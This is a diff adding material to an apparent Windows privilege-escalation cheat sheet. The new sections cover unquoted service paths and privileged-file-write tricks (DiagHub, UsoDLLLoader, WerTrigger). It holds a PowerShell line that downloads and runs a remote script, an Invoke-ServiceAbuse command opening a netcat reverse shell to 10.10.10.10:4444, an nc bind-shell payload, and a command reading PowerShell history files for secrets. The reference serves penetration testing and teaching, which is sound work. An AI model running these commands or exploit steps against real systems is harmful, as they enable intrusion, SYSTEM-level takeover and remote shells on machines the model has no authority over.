@@ -38,6 +38,10 @@
   * [Meterpreter getsystem and alternatives](#meterpreter-getsystem-and-alternatives)
   * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
   * [Juicy Potato (abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
+* [EoP - Privileged File Write](#eop---privileged-file-write)
+    * [DiagHub](#diaghub)
+    * [UsoDLLLoader](#usodllloader)
+    * [WerTrigger](#wertrigger)
 * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
   * [MS08-067 (NetAPI)](#ms08-067-netapi)
   * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
@@ -457,6 +461,7 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ### Powershell history
 
 ```powershell
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 cat (Get-PSReadlineOption).HistorySavePath
@@ -676,7 +681,24 @@ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
 
-Metasploit provides the exploit : `exploit/windows/local/trusted_service_path`
+* Metasploit exploit : `exploit/windows/local/trusted_service_path`
+* PowerUp exploit
+
+    ```powershell
+    # find the vulnerable application
+    C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
+
+    ...
+    [*] Checking for unquoted service paths...
+    ServiceName   : BBSvc
+    Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
+    StartName     : LocalSystem
+    AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
+    ...
+
+    # automatic exploit
+    Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
+    ```
 
 ### Example
 
@@ -961,6 +983,59 @@ Binary available at : https://github.com/ohpe/juicy-potato/releases
         [+] CreateProcessWithTokenW OK
     ```
 
+
+## EoP - Privileged File Write
+
+### DiagHub
+
+:warning: Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary DLLs.
+
+The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM. 
+This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the `C:\Windows\System32` directory. 
+
+#### Exploit
+
+1. Create an [evil DLL](https://gist.github.com/xct/3949f3f4f178b1f3427fae7686a2a9c0) e.g: payload.dll and move it into `C:\Windows\System32`
+2. Build https://github.com/xct/diaghub
+3. `diaghub.exe c:\\ProgramData\\ payload.dll`
+
+The default payload will run `C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe`
+
+Alternative tools:
+* https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag
+* https://github.com/decoder-it/diaghub_exploit
+
+
+### UsoDLLLoader
+
+:warning: 2020-06-06 Update: this trick no longer works on the latest builds of Windows 10 Insider Preview.
+
+> An alternative to the DiagHub DLL loading "exploit" found by James Forshaw (a.k.a. @tiraniddo)
+
+If we found a privileged file write vulnerability in Windows or in some third-party software, we could copy our own version of `windowscoredeviceinfo.dll` into `C:\Windows\Sytem32\` and then have it loaded by the USO service to get arbitrary code execution as **NT AUTHORITY\System**.
+
+#### Exploit
+
+1. Build https://github.com/itm4n/UsoDllLoader
+    * Select Release config and x64 architecure.
+    * Build solution.
+        * DLL .\x64\Release\WindowsCoreDeviceInfo.dll
+        * Loader .\x64\Release\UsoDllLoader.exe.
+2. Copy `WindowsCoreDeviceInfo.dll` to `C:\Windows\System32\`
+3. Use the loader and wait for the shell or run `usoclient StartInteractiveScan` and connect to the bind shell on port 1337.
+
+
+### WerTrigger
+
+> Weaponizing for privileged file writes bugs with Windows problem reporting
+
+1. Clone https://github.com/sailay1996/WerTrigger
+2. Copy `phoneinfo.dll` to `C:\Windows\System32\`
+3. Place `Report.wer` file and `WerTrigger.exe` in a same directory.
+4. Then, run `WerTrigger.exe`.
+5. Enjoy a shell as **NT AUTHORITY\SYSTEM**
+
+
 ## EoP - Common Vulnerabilities and Exposure
 
 ### MS08-067 (NetAPI)
@@ -1116,3 +1191,6 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
 * [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)
 * [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
+* [Abusing Diaghub - xct - March 07, 2019](https://vulndev.io/howto/2019/03/07/diaghub.html)
+* [Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)
+* [Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019](https://itm4n.github.io/usodllloader-part2/)
